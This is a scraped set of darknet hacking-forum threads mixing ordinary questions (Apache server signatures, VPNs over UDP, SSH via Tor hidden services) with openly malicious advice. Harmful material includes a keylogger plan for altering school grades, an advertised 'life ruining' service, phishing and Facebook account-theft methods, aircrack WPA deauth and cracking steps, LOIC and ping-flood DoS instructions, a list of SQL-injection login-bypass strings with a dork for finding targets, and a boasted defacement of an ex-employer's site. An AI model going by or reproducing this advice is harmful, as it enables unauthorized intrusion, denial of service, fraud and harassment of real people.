You have the book called Black Hat Python which you easily find using Google. Here is a PDF version: https://pythonizame.s3.amazonaws.com/media/Book/black-hat-python/file/af0ef90e-83cf-11e5-964d-04015fb6ba01.pdfYou also have the book called Gray Hat Python by the same author: https://www.nostarch.com/ghpython.htmHowever, despite the attractive title of the books above, I highly recommend you to spend time learning pure Python, and then do whatever you want with it (without having to read a book which is specifically about Python for hacking). An awesomely good book for that is the book called Dive Into Python which you can get freely on its official site: http://www.diveintopython.net
Thank you very much Topman! Will definitely look into those books.-AG
Another book is called: Violent Python : a cookbook for hackers, forensic analysts, penetration testers and security engineers http://gen.lib.rus.ec/search.php?req=violent+python

Hello,I'm running an Apache2 webserver and I want it to hide its HTTP header and every other information it provides about itself, e.g. the last line in the directory indexing page. Does someone know how to do that?Greetings,whitehathacking
It's called the Apache Signature, you can hide it if you wish to, take a look: http://ask.xmodulo.com/turn-off-server-signature-apache-web-server.html
Thank you! That helped a lot. Now I have a server that says nearly nothing, except it's an Apache server (that can be read from its HTTP header). Is it possible to turn that off, too?
No you can't really hide the fact that you're using Apache by editing the apache config file BUT you can replace Apache by something else using modsecurity which is basically what you want, take a look: https://www.howtoforge.com/changing-apache-server-name-to-whatever-you-want-with-mod_security-on-debian-6
Looking to buy 100GBPS+ DDOS power on both L4 and L7 -- for educational purposes. If you own a different type of net type but same DDOS power that fine :)
For educational purposes? Really? Lol
Can you explain what is the educational purpose behind doing DDOS ? Are you experimenting something new ?
Hello,I want to run a Tor relay and a hidden service on the same machine. For testing reasons I additionally enabled the "CountPrivateBandwidth" option because I wanted the HS traffic to be counted like it was relay traffic. Is that safe? For my service it is very important to stay hidden for a long time, but I don't want to give up my relay.If this isn't safe, what can I do to get a safe configuration?Greetings,whitehathacking
Anyone know any good good VPNS which cover both TCP and UDP protocals rather than just one or the other?
I don't think there's such a thing as a "UDP VPN" seeing as UDP is a connectionless/non-handshake protocol. But hey, I could be wrong.
I know this is an old post, but i am posting because as n00kt said, his information is wrong and may confuse someone.In fact VPNs can be deployed on both, TCP and UDP.As n00kt said, UDP protocol is stateless, this means that it makes no checks on how the connection is going, there is no protocol handshaking, just free streams going from a transmitter to one or more receivers.The point is that UDP VPNs performs better than TCP mainly by the fact that it does not have an extra error correction header within the datagram/packet and does not need an ACK/confirmation response, so by design UDP VPNs does not care if the data reach its destination.This might look strange, but have in mind that we are talking about an VPN here, within this layer there will be another protocols, and this protocols will be responsible provide the handshake and error correction algorithms.Now imagine that you have a connection running within a TCP based VPN and some bits of information does not reach its destination. As TCP checks if data transmission was ok, it will retransmit all that packet once again, which in some cases might be futile extra overhead, such as an video streaming, which the player computes and fix small missing data errors.Also in some cases the error correction on the VPN layer may conflict with the correction made on the inner protocol, causing data do be reassembled out of order, which means more retransmission or data corruption, more ACKs to wait, and on extreme cases i believe it could cause even a deadlock.So tunneling TCP within UDP is better than UDP within TCP.Now regarding the main question of this thread, one can use OpenVPN with both protocols TCP or UDP, but for the same reasons as i said, its developers warns you to give preference to UDP.
Hopefully, this is the right place for this.  I've had an idea for a while now and figured that it would be best for me to share it with someone who could do it, and do it well.I've had this idea for a reverse-hacking software that sits idly on your desktop and is always running as long as your computer is on.  If someone tries to hack into your computer and access ANY of it without consent, it freezes their computer, locks it so they are unable to do anything, pulls files from their computer to yours (or your cloud) and immediately notifies federal authorities (This last part I think should be made an option on the software).I guess you could have a little fun with it.  Maybe while their computer is frozen and their files are being extracted, you could force their computer to play/loop a VERY loud porn clip.  Maybe, once enough has been cleared off of their hard drive, and there is room, you could fill their hard drive with PDF's full of hate speech, or make it look like they've sent email's stating that they're going to kill a predominate member of some government.I mean, if you're gonna do it, you might as well do it right and totally fuck their world up! Right?  Let me know what you think.Regards,Knum Knutz
HiThis sounds like a good idea if it possible which i don't know if it is. But if you want to make it and need some help I would be happy to.Logo
See, that's the thing, my programming abilities, at the time being anyway, are limited to HTML and some XHTML and some Java. my above-mentioned idea is way above my abilities and pay-grade.  Hell, whomever writes the program can take ALL of the credit for all I care.  All I would ask for is a free copy and, if you make it rich, toss me a coin or two.  You can even do it under the radar so no one has to know jack squat.To Logo, and anyone else that may be reading this thread, please feel free to take this idea and run with it.  I'm just trying to do my part and contribute to this group and contribute to the free exchange of ideas to make the world better.Regards,Knum Knutz
I had this idea about a year ago, it's pretty cool but I need more skills, so I'm working on that for now. If you make any progress please post it here if you want, I'm really interested!
I definitely will, conqueror.  I guess great minds think alike ;)  
Your idea has elements of what I'd like to see in the thread I started a few days ago. What do you think will be the attitude of the real hacking geniuses that frequent this site? Maybe you have some of the answers to my initial questions KnKn, eh? Please have a look at: http://rrcc5uuudhh4oz3c.onion/?cmd=topic&id=14379
Take this idea to the admins of 404-sec.com/forums/ they are really good with that kind of stuff.
This is the main idea behind a honeypot.A honeypot creates false services, or even entire networks full of services to track hackers activity.The difference here is that your reverse hacking software also tries to hack-back, some honeypots also got this kind features.The hard part is that each attack uses different techniques and software, so it is difficult to predict how to hack-back.To hack a computer one must have open ports and valid credentials or exploit code that abuses the software to inject a payload, that in turn will do what you want to the victim machine or give you a reverse shell.Such reverse hacking software could be possible if it feature a exploit database for the different software a hacker may use to hack you, and this is quite difficult, specially by the fact that the hacking tool being used against you must be vulnerable.Regarding the loud porn stuff: if i were the hacker i would just turn the speaker off.On freezing the hacker computer: to freeze a computer you need administrative/root privileges, If i were the hacker i would turn off/reboot the machine before you get these privileges. as a last resort i hold the power button ;]On the hate speech and threat emails: This will work against you because forensics work should point out that this was not made by  the hacker but you. Also there is no need for this since you have a legitimate attack against you.On downloading the hacker files: a real hacker don't hack you using their real computer, if they use their machine, they create a virtual machine which separate the hack environment from the real one.So, i think such software may be possible but really hard to develop, mainly because one open port on your computer is not an open port on the hacker computer as the tool the hacker uses to hack you does not let you send commands to  the hacker computer unless it is exploited
I'm new here but I've noticed that there are a lot of verified and unverified users who want to learn the basics of hacking, learn and use available hacking tools, and enter the "wonderful world of hackers". I can't for the life of me figure out why someone wants to do this. Is it the 'glamour', the criminal thrills, a desire to take money and information-for-money from the innocent? Learning hacking as 'ethical hacktivism' as I've read could be a good, and less tasteless reason.I on the other hand do not want to have to learn hacking skills unless it is to learn how to hack in order to protect computers and networks FROM hacking? I would like to elicit (solicit?) information from the wise and experienced in just that subject.There must be others like me that don't want to learn hacking, but we do want to learn from those that do how to protect and guard against it. A few points and then some questions. I am using an encrypted Linux based PC with Tor and NoScript set to global and have not been attacked, virused, malwared, or otherwise compromised, as far as I can tell. I 'think' I'm reasonably anonymous and try to protect my privacy with the usual social mods and precautions. But I'm sure there is more that I could do to shield and conceal my activities. I adopted the handle Absconditus in that effort, as it is Latin for hidden. One thing the Internet teaches us is that if one has a problem or formulates a question about something, the odds are excellent that one is not the first to do so. Ergo, we search the Internet for someone that has had that problem solved or that question answered already. I question; therefore, there must be an answer. And as the saying goes; "answers are easy, it's asking the right questions that's hard."So, questions:Is there a site that one can go to that will test a browser and computer setup for weakness and advise me how to improve my security?What are good methods and practices to protect web-attached networks from external hacking? (Internal hacks and social engineering attacks are another matter.)What software or methods can I employ on a computer or network to detect whether or not I've been hacked/attacked?I'm sure I will think of others as the thread develops (hopefully) on this topic. I await the input of others with this interest!
straight up you either need to suck it up and learn, or find a white hat to hack you and test your security. 
I appreciate your honesty. Believe me, I have been learning. That said, I stumbled across a DW site some months ago that would give a sketch of the browser connected to it - just can't find it now. I guess it is as you say and I'll have to 'go it alone'.
Found two good resources for privacy/security newbies. One will test the browser settings.myshadow.orgpanopticlick.eff.orgIf anyone has found other useful resources, please share them.
@Absconditus Thanks for the info and for bringing up the topic. We are in similar boats.
Hello,does someone know some tips to run a safe hidden service. I want my server to tell nothing - and I mean really nothing - about itself and its configuration, not even the installed webserver or something like that.Greetings,whitehathacking
I've been working on it for days but my Kali Linux can't find any wireless networks. It kept on searching for one but nothing seems to be detected. Any know how guys?P.S. I'm using USB bootable type.
Clarification request:Is Kali linux not detecting your wireless network card, are you trying to connect to a wireless or are you trying to scan and capture a WPA handshake so you can crack the passkey and gain access to the network?If your talking about the later.open terminal and do the following:airmon-ng check killairmon-ng start <wireless interface which I will call wlan0> This puts your network card into monitor mode if it is capable. If your using and adapter let me know as the steps are different.airodump-ng wlan0 < this will list the wifi signals. open another terminal and do the followingaireplay-ng <--deauth 0 <this number clarifies the amount of packets being sent across channels> or -o 0> [set more options here] The usage of aireplay-ng can be found by typing --help after the command to display the options and how to write your statement.If all goes well look on the other terminal and you should see in the top right hand corner WPA HANDSHAKE blah blah blah.This means you have successfully captured the wpa and can run it through aircrack-ng to perform a dictionary, brute force whatever. However I will guess if its a WPA2 PK key then I do believe you have to use a dictionary attack. However look up password hashes and etc to familiarize yourself as some passwords would just take forever to crack <literally> like if your trying to crack say a 100 char password using upper lower case along with spaces numbers and special chars I would hang it up. As it pry not happening. At least not without a shitload of computing power on your side.If your simply having problems connecting back to your wireless. Simple command sudo service network-manager restart should do it. 
@rinzlerider2000Kali by default does not enable the wifi card in some cases.Open a terminal and become root (sudo su -)root@yourmachine:~# ifconfigdoes your wlan0 or anything related to wireless show up?are you on Kali as a VM?  if so look in the options menu and see if it is a device you have to grant access to.There is a chance that your drivers are not readily available here is what I found on the clear net.Copied from StackExchange:May be your wireless card is in turned off state, does the laptop have any dedicated physical switch or key combo(like Fn+F3 on my acer laptop) to turn on/off Wi-Fi ? most laptops also have a LED to show Wi-Fi card state.Device firmwares are not pre installed in kali-linux(my last used version 1.0.4 can't tell about latest versions) , so if not already installed, install them.sudo apt-get install firmware-linux firmware-linux-free firmware-linux-nonfreeInstall Broadcom wireless card firmwaresudo apt-get install firmware-brcm80211 firmware-b43-installer firmware-b43legacy-installer broadcom-sta-dkmsThen use proper kernel drivers, b43 or b43legacy, iwlwifi is Intel Wi-Fi card driver so firmware-iwlwifi is not necessary.Hope something here helps... Let us know if you're still out of luck.umbra3
@m0us3 My kali linux is not detecting my wireless card.@umbra3 I downloaded broadcom wireless card firmware but i don't know how to open it. 
I'm making a thread where people can share their thoughts on how secure certain encryption algorithms are in respects to both regular hackers and intelligence agencies.I'm curious mostly in AES-128, AES-192, AES-256, and PGP, and how vulnerable they are to being cracked by1. pretty good hackers, and 2. top-level intelligence agencies (NSA), even if all we can do is speculateFeel free to mention other encryption algorithms too.
most of my regular passwords is encrypted with 32768-bit length = 4096 characters password xDPGP should be the most secure, other than making your own encryption algorithm //G0dR4pe
If the password is even a decent length (over 10 characters) then it is insanely hard for anyone to crack PGP. This is why most governments are trying to implement backdoors into PGP software, which is not working out for them so far.
I would suggest triple encryption. such as AES-256, Twofish-256, Serpent-256 with whirlpool 
A twenty character string "master password" (letters, numbers, symbols, upper/ lower case) works wonders in something like Keepass or PWSafe.  Search around on sourceforge.net (clearnet) for those items and brush-up on what ShadowKing mentioned above.

Hello! I am looking for how to make a shell script preferably to run that would give a website "traffic". Would anyone happen to know anything about where I could get the code for this. If it is simple enough to copy paste into the comments, please do.Thanks in advance!
something like   while :   do      wget -O /dev/null -q $url   donewill create traffic on $url.However, the real problem may be more complicated, especially if the traffic is counted only if it comes from differing IP addresses.  Using tor (or a few VMs dispersed over various hosting providers) might help (a bit).Also, it may also be that you need to modify headers (user-agent, etc) regularly.
Can someone teach me how to hack into a school system to change grades and permanent records
Impossible to say from the information you've given if you could get access externally. Physical access should be easy enough if you can get your hands on a key logger and attach it to a machine that you know admins will use. Most teachers should (probably) have admin accounts to enter grades in the first place, so any computer they use would work. Collect the ksl after a week, review the logs and you have access.Just a tip, make sure they don't keep paper records before you try messing with data. If the information you enter/change gets called into question, you're in trouble.Good luck.

Hi, Recently I have been trying to access my laptop over SSH. I can successfully do it over LAN, but not over WAN. I believe that I have port-forwarded my router properly, and let my firewall let port 22 go through.My laptop is running Linux Mint 17.3The device I am using to ssh into the device is a Samsung Chromebook (non-developer mode)Thanks for any help!
Just connect to your router and portforward properly, what's the point of this post? lol
I have port-forwarded my router, using a variety of online tutorials, and I have done everything right, yet it still doesn't work. That is my problem.
Snickers: why not install tor on your Linux machine, then configure a hidden service forwarding to localhost:22 and you have a free, NAT compatible, permanent address to connect your machine :)
Just curious, how would I go about doing that, and how would I make it use SSH?
so, first you need to install a SSH server on your host, on my debian system I do:   sudo apt-get install sshthen, you can verify it answers by doing   telnet localhost 22it should say something like:Trying 127.0.0.1...Connected to localhost.Escape character is '^]'.SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u3Then you need to install the tor package:   sudo apt-get install torthen configure it somehow (see e.g. https://www.torproject.org/docs/tor-doc-unix.html.en#using)then add a hidden service to your tor configuration, restart tor:   sudo -s   cat >> /etc/tor/torrc <<EOFHiddenServiceDir /var/lib/tor/ssh-serverHiddenServicePort 12345 127.0.0.1:22EOF   exit   sudo service tor restartthen you should wait a few minutes, get the hostname for your tor hidden service:   sudo cat /var/lib/tor/ssh-server/hostnameand then try a connection to it: (from the system itself or another system with tor + torify installed and configured):   torify ssh -u USER $(sudo cat /var/lib/tor/ssh-server/hostname)that should work!
Is there any way that I could do it from my chromebook? Since I can't put it in developer mode, I can't install tor or torify on it. If there is any way to do it, that would be great.
IS this what your question is about; what I think you're trying to do:(1) you want to SSH into your laptop from a remote place?  (ie. your laptop is at home)    -Cool if that is the case; setup a static IP (simple to try #ifconfig {eth0 or wlan0,etc} IP address         Example:    You@root:~# ifconfig wlan0 192.168.0.123      On the router most will just use port 22, but why not skew it so random port scans don't hit it immediately.       Port Forwarding {on router}       Name           Port          IP             Internal Port      Type      YourLaptop     16239       192.168.0.123         22              TCPNow on your SSH client from inside outside or on the moon....you@WANIP:16239   or    LinuxUserName@22.0.1.1   <---- Obviously what ever your WAN address is          just change the standard '22' to 16239 and when your router gets hit it forwards to your static ip and port 22Or if your use ddnsyourfunkyddns.noip.com:16239usernamepassword
This still doesn't work for me. The port forwarding layout of my router is Application | Port From | Protocol | IP Address | Port ToI have set it up as SSH | 16239 | TCP | myipadress | 22My router is running DD-WRT and acting as a wireless repeater.Whenever I try to connect to it, it says Connection Refused. I have double checked all of my settings, and nothing is incorrect that I have noticed.The client I am using is Secure Shell in the Chrome Web Store.It gives me an error with status code 255.I can't SSH into localhost:16239 either from my laptop.If you could tell me what I am doing wrong, that would be amazing.
Im a beginner programmer and im looking for a beginner level multipurpose language that can be used to hack but still be able to design my own programs for fun with it.
Most people think they need to learn a syntax, and choose the one that's the most powerful. But that's the wrong approach if you ask me. You should start learning how to solve problems. Python would be a great beginners language.
Totally agree with bynRoRF, totally. Without thinking, you'll do nothing close to hacking, period.
I'm trying to get a little revenge for this woman online who was abused by many members of the forums for a site called Super Hero Hype. I promised her I would hack the site (though I'm a newb to hacking) and maybe troll some of the users. The thing is they ban your IP address if you do anything bad. My brilliant idea? I decided to use Tor so they couldn't find my IP address, but the thing is that the site automatically will not allow you to create an account if you are using a proxy/VPN or something like that. Does anyone know a way to get around this? It's automatically a function of the site, it's not like mods necessarily see it and control it so I don't think it would be too hard, but I'm such a newb I don't know what to do. By the way, I've been trying to learn more about hacking and can anyone recommend any resources for me? I'm already on Hack This Site.
Would phishing with a fake "we've detected abnormal activity on your profile, please log in and verify" email be the best approach to do this? I have the email, and I would like to gain entry purely for information purposes. I'm just wondering the easiest way to go about itThank you!
Obviously I know what it stands for, but someone mind giving me a rundown or link about it in detail, and also how and where I can get one?Please and thanks Intel Exchange

Hello Community,I am offering hacking and life ruining services. For more info you can check out my site at : http://vlr2s4g732zw6yim.onion/?p=577This is a paid service. Do not contact me asking to learn you how to hack or begging me for a freebie. HappyHippy
Did you need to post this in so many categories? :P I don't see how this is software related.Fine line between advertising and spam.
@seeker2216 i posted in the sections where i though the thread belonged. If hacking has nothing to do with software you really need to explain me what hacking has to do with.
Well no, it does, but not in this thread, since this is for the discussion of good software, and people asking questions about which software best fits a particular purpose. You're offering a service, not discussing software.But whatever, no hate :P As you were..
Your website is gone now. 
You can email me at happyhippy@sigaint.org if interested in my services. My website is offline.

Hello, this looks really similar to: http://rrcc5uuudhh4oz3c.onion/?cmd=topic&id=13790
So the whole backdoors in encryption software deal,why?What's the real reason, if governments want to peak in on everyone's stuff what is their final outcome? Fear of being overthrown? Are they all just power tripping. I don't believe they're trying to 'protect' anyone by invading privacy. Thoughts and opinions on what will happen if they get their way?
i personally think it will be a quick path to a rerun of i think egypt a few years back, where no internet what so ever was allowed. this could also blow over and do nothing or could cause other countries to follow in their foot steps and cause a world wide panic. 
What Encryption software is still safe?
what's the best way to get through password prompts on any website? I've been using Image-line's FL Studios and have the full cracked version but it's still missing parts of it and the only way to get the missing plug-ins is to get them through Image-Line, and I need a password for it. Can someone help  Please and thank you
Does anyone know if there have been any new ways to crack WPA?
Personally I have found that WPS pin attacks work better. People for some reason forget to turn WPS off.

I recently obtained 1800+ active email addresses and wish to send a mass email to them all at once, 1 email a day, for 30 days straight. Now my question is, what would be the best software to send that many emails? I would prefer it to be an online service, similar to Gmail for example, with an inbox so i can receive replies and manage contacts.I would use Gmail, Yahoo, ect... which can be anonymous to a point over when used on TOR with false information. But the recipient number is only up to 500 emails a day, which is to low for this.So, whats the best mass emailing software do you suggest i use for this type of activity?
Hi, so I'm looking for a crack, serial number or keygen for a pice of software called realizzer. It's a lighting design software. If anyone has a working crack please tell me.Link (clean net)http://www.realizzer.comThanks Logo
I'm new to Intel exchange and would like to learn how to code, anyone have any good links or pages , mabey even an ebook that could teach me a little? Even a 1 on 1 lesson would be nice =).
are you on linux or windows?
Windows =)
Well if all you want to do is learn how to code. There is www.codemy.net , https://teamtreehouse.com/, http://www.w3schools.com/. These are some great places to learn. However I would get a linux system. One you will literally live in the terminal. Sort of like the windows command prompt. You get used to navigating a system and it really helps you with coding. For instance right out of the box multiple compilers are at your disposal right there. Python, C, C++, etc. Also you can start by simple bash commands. If nothing else it helps you understand how formatting works. Headers and so on. And if you don't feel like ditching your windows system simply get VirtualBox. Yes its free and you can download linux and run it right in virtualbox. However I would get something like ubuntu and do like a dual-boot setup. If you need more info on that let me know. 
Another fun site on the clear net to check out if it still around is "Hack this site" .org  (Google it)It's easily solvable via YouTube when you get stuck...This site will get you worked into using various methods and coding...Also check out any CBT training you can find either free or via torrent download.In response to your dual boot thought... Why not just download VMware Player (or VMware Workstation) and install a couple versions of Linux to try it out first...umbra3
I know I sound like a total noob, but I want to learn about hacking. I want to start small. Anyone know of any literature I can read or any sites? I want my first hack to be into a password protected computer. Or on a small business website.
Check out www.HackForums.comAlso, if you want to hack a password protected PC, check out Ophcrack
Thanks booby169. I'll check that out and be back later with more questions I'm sure.
If you want to become a proper hacker, you must be able to know where someone might have left a security-hole, and how to exploit it.This means that you must learn to understand and program several languages well, and you also need to know how several standard systems handle their data.To be able to hack websites, you should as a minimum learn to program PHP and to use SQL database commands; being able to read HTML is pretty much required too.Other important languages: C and or C++, Python, JavaScript and Assembler (hardest one of all, with greatest insight into inner workings, often the difference between a great programmer and a programmer who can't always quite achieve what he/she wants).Knowing how to program a programming language, doesn't mean knowing all it's commands and their usages, most importantly it means knowing the syntax (grammar) of the language; when you know the grammar, you can quickly find the functions you're looking for, and read how to use them, when you need them. Of course, knowing all the functions of PHP for example, helps you to determine which functions someone might be using on their website, which in turn helps pinpoint what security holes may exist.In my experience, the easiest way to learn how to program, is to edit something somewhat simple that already works, and then seeing what the results are. 
Hacking into a password protected computer might not be hard. You'll just have to edit the SAM file of the computer (Assuming that you have direct access to the computer). Hacking into a small business site requires you to find some vulnerability like SQLi or file inclusion and such. 
http://sourceforge.net/projects/loic/^ Low Orbit Ion Cannon (DoS). It's just a binary file, but turn off your virus protection while installing, or else it won't let you, because it will be classified as a 'Hacktool', which is considered dangerous, but I have it and can say it's 100% safe. Just enter a URL, a DoS Method, A message, and set the threads to 1000. Don't change ANYTHING else, or else it won't work. You can input IP's too. Happy hunting.
Also, if you want to use SQL to get into a small business site, just try this:Username: AdminPassword: '1'or'1'='1'^Saying that 1=1 (Which is true) so that says says /true, and lets you in. Here are some other threads you can try for SQL: ' or 0=0 --" or 0=0 --or 0=0 --' or 0=0 #" or 0=0 #or 0=0 #' or 'x'='x" or "x"="x') or ('x'='x' or 1=1--" or 1=1--or 1=1--' or a=a--" or "a"="a') or ('a'='a") or ("a"="ahi" or "a"="ahi" or 1=1 --hi' or 1=1 --hi' or 'a'='ahi') or ('a'='ahi") or ("a"="a' or ' '='Also, download netsparker: https://www.netsparker.com/netsparker/   (Scan sites for vulnerabilities. Make up a fake business, name, and info. Input a URL , and scan. If it shows up red as "SQL Vulnerable!" It can be hacked. So, either download netsparker, OR an alternative to finding vulnerable sites is to google: "admin-login.asp"  It will bring you to a bunch of site logins. Good luck.
Something else you CAN do without downloading ANYTHING as is:Search your computer for "CMD", or "Command Prompt".Should come up like this:Microsoft Windows [Version 6.1.7601]Copyright (c) 2009 Microsoft Corporation. All rights reserved.C:\Users\(Your PC name here)>^ So do as I do.C:\Users\(PC Name)> Color 0a                  <stereotypical green text.C:\Users\(PC Name)>ping google.com   <The site I chose to show youPinging google.com [173.194.33.134] with 32 bytes of data:Reply from 173.194.44.134: bytes=32 time 25ms TTL=55Reply from 173.194.44.134: bytes=32 time 25ms TTL=55Reply from 173.194.44.134: bytes=32 time 25ms TTL=55Reply from 173.194.44.134: bytes=32 time 25ms TTL=55Reply from 173.194.44.134: bytes=32 time 25ms TTL=55Ping statistics for 173.194.33.134:     Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),Approximate round trip times in milli-seconds:     Minimun = 15ms, Maximum = 26ms, Average = 18msC:\Users\PC Name> Ping 173.194.44.134 -t -l 65500                        ^Number from earlier = IP adress.Do this to the site you are attacking until you get this message:Request timed out.Request timed out.Request timed out.Ping statistics for 173.194.44.134:     Packets: Sent = ?, Received = ?, Lost = ? (100% loss),Do not choose google, I just did that as an example. You will get tracked. Choose a smaller site. That was the CMD method.
So there. CMD, SQL, & DoS. Three decent methods. CMD takes a few hours. like 1-5 (In my experiences.) Same with DoS. SQL is instant.
If you really think a flood ping will take a website down, you're living in the past. Any proper firewall made in the last 5 years will ban your connection within seconds. When you get the timeout, you've either maxed out your own internet pipe, or they have stopped taking your pings. The SQL attacks can work for some smaller shops. However, there are a lot of businesses making money on correcting these flaws. Simply sanitizing SQL input is a small task for a DBA, and can prevent these attacks. 
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^Dude, DoS is superior in all ways, yes. I don't recommend ping (Because it sucks ASS), I still support Low Orbit Ion Cannon 100%, I'm just saying: It's a method. Not a good one, but nonetheless is still a method. As for the SQL, I still stick with Havij. I'm just trying to help someone understand the concept. So, please understand: I didn't say TO DO any of those, I simly acknowledged their existence. However, you are right on both subjects, SQLmap, AND Firewalls block these attacks now. But over all: Go with LOIC, & Havij.
I'm just saying ping isn't worth listing anymore. Just try to ping major websites. Many of them won't return it because ICMP is disabled at the firewall (because people use it for these kinds of things). I do agree with your most recent comment. 
Lol ping google down. They are going to have a good laugh at us!
I know. But recently a friend of mine made a blog, but didn't use a firewall and so I ping crashed it. Yes most corporation sites that have a firewall that isn't from 2001-earlier can be attacked. But your right. It isn't reliable, or even worth mention.
Hmm. So I guess if you want to try ping crashing a site, you can search for sites using google and then use change the time to 2000 or somthing. That way only the old sites are shown... I should find some time to try that. But I'm still trying at SQL injection lol. I am so bad at it. I somehow always can NEVER find a good site to hack with... Does anyone know of dummy sites you can practice on??
http://www.hackthissite.org
@Styl3x this method does work but:1. Only on very small websites2. Need at least 5-10 machines to get anywhere close to getting a result3. Gonna still take a few hoursEasiest method would be to exploit a known security hole (or find your own if you have enough spare time) and find out how to exploit it (you will need knowledge of many programming languages to do this as each site is different)From there, you can smuggle your own data package into the website's code which can do anything such as track IP's for botnet usage, log CC info, p/w info, etc.It took LulSec months to crack into Sony. And even then there were many thousands working on it.Remember, practice makes perfect! :)Best I have hacked is my old employer's website. Fired me for a bullshit reason, so I defaced the homepage :)
And no, I didn't know the root password to begin with. I was an apprentice. Didn't have access to that shit. Made it more of a challenge :)

I don't know all that much about programming and different languages such as HTML, C++, etc. , but I've heard that if you learn one of those languages, you could essentially write viruses.  How is this done?  How do you take the virus that you've written and distribute it to your target?  How do you customize what the virus actually does to a person's computer?It's just a subject of interest to me and I figured that this would be the section to ask it on.  Thanks for any information you can provide!
It might sound easy, but it's not...To write a virus, you need to know exactly the file format of an executable file. Then, to infect it, you have to rewrite into the executable, but without breaking the original code, since that would raise suspicions. But not only that, you also have to take into account the different types & versions of executables and instruction encodings.This was a few years ago. Today, it's even worse: Anti-Viruses scan every file to find traces of malware, which means you have to also hide the changes to the anti-virus while still keeping the system infected.
Ah, that does seem pretty hard.  To me at least, I'm sure that there are plenty of people out there who do it for shits and giggles.
You can do it by learning how to code ;-;There are certain virus makers out there, that are easy to obtain both on the deep web and even the surface web
looking for a mentor to teach me about hacking
And i'm looking for deepweb comrades in general. hackers and crackers and the like
If you want to learn to hack, learn the languages. You can use clean websites like www.w3schools.com or check out Code Academy. Start with the basics like html and javascript, and work up from there to python etc. If you're open to finding a hacking mentor on the deep web, you're open to getting yourself hacked. Be smart. 
Agree with Ampersand!  I would argue just dive into C/C++.  Ultimately, that is what most everything is still based on.  Remember hacking is just exploitation of a hiccup in a system.  Humans don't create amazing code for two reasons 1) We are fallible, and 2) to create something so secure that other humans would find it worthless to find exploitations would take decades.  We live in a era where time is money, so they have to crank out versions, iterative development.  They publish the alpha versions to a select few to do quality assurance to a "good enough" point, then publish for sale.  It relies on bug reports and volunteering information to fix it. If you get ahead of others, then you can exploit.  Another thing to consider, is getting into the "mindset" of the computers.  They haven't really changed.  The only thing that changes is we keep abstracting languages to higher and higher levels.  The compilers take it all the way back down to machine code.  If you can start diving into assembly language.  It is the nuts and bolts.  Couple that with a debugger to see how the instructions are carried out.  If you find that at a certain point the program calls information from a file that you can use to gain access else where, you create a file and execute it in that program.  You now have a virus(?).  I'm not all that confident in my explanation, but hopefully, others can confirm or refute it. 
It's all about the mindset. Skills come next. Basically you need an entry or an exit point so you can hack. As Rick1029384756 said the example with the file. If you cannot have access then you go cracking(reverse engineering where you'll surely need Assembly knowledge). Sometimes you'll need days or even weeks in order to gain access (or "hack") systems, you need to "study" them. There is nothing completely standard on hacking/cracking. Personally i prefer C/C++, Assembly and Python(Python mostly for scripting), HTML, PHP, javascript etc and some good understanding of OS' been used for any service you want to hack. I would recommend some sites for the basic stuff. Some of them are http://hackthissite.org (mostly for hacking) and http://smashthestack.org/ (mostly for cracking). Don't know if these sites help you though.
Also important for hacking is to understand how a os works, how networks work, how a program works that's the half way. The next thing is to dive in deeper, how to use network scanners, get access, and stuff. For cracking is reverse engineering important, so u need a good amount of knowledge about programming languages (.NET languages are easily to decompile, C++/C and C# are harder.) If you are a good reverser, you can literally crack everything. 
i will also say that a basic to advanced understanding of networking and how the protocols is used. therefor i recommend a course in CCENT or CCNA.no matter how good you are at code writing in all the different languages, if you dont understand basic networking and routing, you might have a security problem you self and you dont want that as a hacker. u have to use different techniques to not get traced. it not that easy as to install tor browser and start hacking clearweb sites.//G0dR4pe 
Try dotcppfile he is a good teacher . 
I recomend building a hack lab before trying to hack anyone. This has helped me tremendously, but as everyone has stated you need to learn different languages. Depending on what you are trying to hack or the method you are using may require you to know a certain language. Say if your trying to hack into a database then it would be necessary to understand PHP and SQL. Also I have found that learning how to make scripts, knowing Python, and knowing C#/C/C++ go a long way. The clearnet also has several great places to learn. I myself am still learning so I can only state from my experiences.

  I know this subject doesn't particularly relate to software ( except that viruses can be installed on accident when downloading things ) but I just thought this would be the best place to ask this question:Why is it so dangerous to torrent things while on the deep web?  If I were to get on TOR one day and then go to a popular torrent site and download something that hundreds of people on the surface web are downloading, what makes it so dangerous for me?I'm not really a tech nerd, although I would really love to be, hence me asking questions like this, but any answers will help.  Thanks.
If one of the nodes manager wishes to add a little "extra" to your download he is ablento do so, that's why it is so dangerous do download anything through TOR.
Also, if I remember right, Torrent & Tor don't go hand in hand, as in you can't anonymously torrent through tor...

@golf_wangHacking a facebook acount is nothing really hard to do. If you have a brain which is not 100% stupid (i i am sure you do have one which isent dumb), then its really easier than learning a new programming language (by miles).There are numerous methods which can be used to acuire the password of a facebook user, depending on if you know him or not. 1) Social engeniring. This is probably the best way and a very siple way to get the password. You basicly trick the user on entering his password (or details which can lead to his password, depending on the acount and platform) into an input. The input could be created or hijacked by the attacker (meaning you have control over the input and flow of the data which you want, in this case the password). When having inputs control you have very many options to ship the data to you: you could make an application uploading a file whith the password (this would ultimitly require a variable set to the text entered) , send an email with the password (again, the variable is needed here), having the password attached to an outgoing flow of data. These methods can easiy be created and done with a script language of the on the victims OS (For example apple's OSX is very vunerable of phishing as they have applescript, and windows by having batch and serveral more...) or with an actual application made with eg. java..2) using an exploit. This is really advanced though! Youl need an exploit of the victims platform suitable for the attack. I will not supply you with one and i dont think anyone else will.3)Brute-force attack. This method takes very long and is very simple (hance that is is the dumbest). Basicly you just spamm the password with all combinations until the correct one is found.Good luck, these are my suggestions and assuming you not too advanced with this manner, i recomend you the phishing type.
